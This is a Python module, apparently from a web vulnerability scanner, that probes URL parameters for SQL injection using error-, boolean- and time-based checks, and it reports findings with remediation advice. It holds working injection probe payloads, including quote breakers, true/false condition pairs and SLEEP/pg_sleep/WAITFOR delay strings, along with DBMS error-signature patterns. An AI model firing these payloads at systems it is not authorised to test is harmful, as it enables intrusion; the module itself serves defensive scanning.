"""SQL Injection - error-based + boolean-based + time-based with reproduction.

Tidak lagi mengandalkan regex error semata. Semua finding harus lolos
salah satu dari 3 oracle:

1. **Error-based**: signature error DBMS muncul **dan tidak ada di
   baseline** (banyak halaman dev memang sudah memuat kata 'mysql').
2. **Boolean-based**: respons `... AND 1=1` ~ baseline, `... AND 1=2`
   beda signifikan dari TRUE — baru direproduksi 1x.
3. **Time-based**: payload ``SLEEP(5)`` / ``pg_sleep(5)`` / WAITFOR
   memperlambat respons >= 5-0.7s dan baseline jauh lebih cepat.
   Direproduksi 1x untuk meredam jitter.
"""
from __future__ import annotations

import re
import time
import urllib.parse

from cyberloka.active._helpers import (
    append_param,
    baseline,
    candidate_params,
    iter_param_urls,
    replace_param,
    stable_latency,
)
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate

ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning:\s+mysql_",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"sqlstate\[\d+\]",
    r"odbc.*sql server",
    r"microsoft\s+sql\s+native\s+client",
    r"pg::syntaxerror",
    r"pg_query\(\)",
    r"postgresql\.util\.psqlexception",
    r"sqlite3\.\w+error",
    r"sqlite\.exception",
    r"oracle.*ora-\d{4,}",
    r"db2\s+sql\s+error",
    r"mariadb\s+server\s+version",
    r"sql\s+syntax.*near",
]
ERROR_RE = re.compile("|".join(ERROR_SIGNATURES), re.I)

ERROR_PAYLOADS = ["'", "\"", "')", "\\", "';", "' OR '1"]
TRUE_PAYLOADS = [" AND 1=1-- -", "' AND '1'='1", "\" AND \"1\"=\"1"]
FALSE_PAYLOADS = [" AND 1=2-- -", "' AND '1'='2", "\" AND \"1\"=\"2"]

SLEEP_S = 5
TIME_PAYLOADS_TPL = [
    "1' AND SLEEP({s})-- -",
    "1) AND SLEEP({s})-- -",
    "1; SELECT pg_sleep({s})-- -",
    "1' || (SELECT pg_sleep({s}))::text || '",
    "1; WAITFOR DELAY '0:0:{s}'--",
]


def _baseline_already_has_error(text: str) -> bool:
    return bool(ERROR_RE.search(text or ""))


def _scan_url(client: HttpClient, url: str) -> list[tuple[str, str, str, str, Severity]]:
    hits: list[tuple[str, str, str, str, Severity]] = []
    if "?" not in url:
        for cand in candidate_params(url):
            url = append_param(url, cand, "1")
            break

    base = baseline(client, url, samples=2)
    if base is None:
        return hits

    base_has_error = _baseline_already_has_error(base["body"])
    seen_params: set[str] = set()

    # ---- Error-based --------------------------------------------------------
    for payload in ERROR_PAYLOADS:
        for param, mutated in iter_param_urls(url, "1" + payload):
            if param in seen_params:
                continue
            resp = client.get(mutated)
            if resp is None:
                continue
            body = resp.text or ""
            m = ERROR_RE.search(body)
            if m and not base_has_error:
                second_payload = next((p for p in ERROR_PAYLOADS if p != payload), payload)
                second_url = replace_param(url, param, "1" + second_payload)
                second = client.get(second_url)
                conf = "confirmed" if (second and ERROR_RE.search(second.text or "")) else "firm"
                hits.append((
                    param,
                    "error-based",
                    f"payload={payload!r}\nDBMS error: {truncate(m.group(0), 120)}",
                    conf,
                    Severity.CRITICAL,
                ))
                seen_params.add(param)
                break

    # ---- Boolean-based ------------------------------------------------------
    for tp, fp in zip(TRUE_PAYLOADS, FALSE_PAYLOADS):
        for param, mutated_t in iter_param_urls(url, "1" + tp):
            if param in seen_params:
                continue
            mutated_f = replace_param(url, param, "1" + fp)
            r_t = client.get(mutated_t)
            r_f = client.get(mutated_f)
            if r_t is None or r_f is None:
                continue
            t_text = r_t.text or ""
            f_text = r_f.text or ""

            true_close_to_base = (
                r_t.status_code == base["status"]
                and abs(len(t_text) - base["length"]) <= max(200, base["length"] * 0.10)
            )
            false_diff_from_true = (
                r_t.status_code == r_f.status_code
                and abs(len(t_text) - len(f_text)) > 200
                and len(t_text)
                and abs(len(t_text) - len(f_text)) / max(len(t_text), 1) > 0.10
            )
            if true_close_to_base and false_diff_from_true:
                r_t2 = client.get(mutated_t)
                r_f2 = client.get(mutated_f)
                stable = (
                    r_t2 is not None
                    and r_f2 is not None
                    and abs(len(r_t2.text or "") - len(t_text)) < 100
                    and abs(len(r_f2.text or "") - len(f_text)) < 100
                )
                conf = "confirmed" if stable else "tentative"
                hits.append((
                    param,
                    "boolean-based",
                    (f"baseline_len={base['length']}, "
                     f"true_len={len(t_text)} ({tp!r}), "
                     f"false_len={len(f_text)} ({fp!r})"),
                    conf,
                    Severity.CRITICAL if stable else Severity.HIGH,
                ))
                seen_params.add(param)
                break

    # ---- Time-based ---------------------------------------------------------
    base_lat = base["latency"] or stable_latency(client, url)
    for tpl in TIME_PAYLOADS_TPL:
        payload = tpl.format(s=SLEEP_S)
        for param, mutated in iter_param_urls(url, urllib.parse.quote_plus(payload)):
            if param in seen_params:
                continue
            t0 = time.monotonic()
            r = client.get(mutated)
            dt = time.monotonic() - t0
            if r is None:
                continue
            if dt >= SLEEP_S - 0.7 and base_lat < SLEEP_S - 1.5:
                t0b = time.monotonic()
                r2 = client.get(mutated)
                dt2 = time.monotonic() - t0b
                conf = "confirmed" if r2 and dt2 >= SLEEP_S - 0.7 else "firm"
                hits.append((
                    param,
                    "time-based",
                    (f"payload={payload!r}\n"
                     f"baseline_latency={base_lat:.2f}s, injected={dt:.2f}s, "
                     f"reproduced={dt2:.2f}s"),
                    conf,
                    Severity.CRITICAL,
                ))
                seen_params.add(param)
                break
    return hits


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        url = target.base_url
        for param, sig, ev, conf, sev in _scan_url(client, url):
            findings.append(
                Finding(
                    module="sqli",
                    title=f"SQL Injection ({sig}) terverifikasi pada parameter `{param}`",
                    severity=sev,
                    description=(
                        "Aplikasi terbukti mengeksekusi input yang disuntikkan ke query SQL. "
                        "Attacker dapat membaca/menulis seluruh database, eksfiltrasi "
                        "kredensial, atau dalam beberapa kasus eksekusi kode (RCE via UDF, "
                        "xp_cmdshell, COPY...PROGRAM)."
                    ),
                    target=url,
                    evidence=ev,
                    cwe="CWE-89",
                    confidence=conf,
                    urls=[url],
                    remediation=(
                        "Gunakan parameterized query / prepared statements pada SEMUA jalur. "
                        "JANGAN concatenate input ke query. Pada ORM hindari raw SQL berisi "
                        "input user. Tambahkan validasi tipe (whitelist) + WAF sebagai lapis "
                        "pertahanan tambahan, dan batasi privilege akun DB ke yang minimal."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/SQL_Injection",
                        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                    ],
                )
            )
    finally:
        client.close()
    return findings
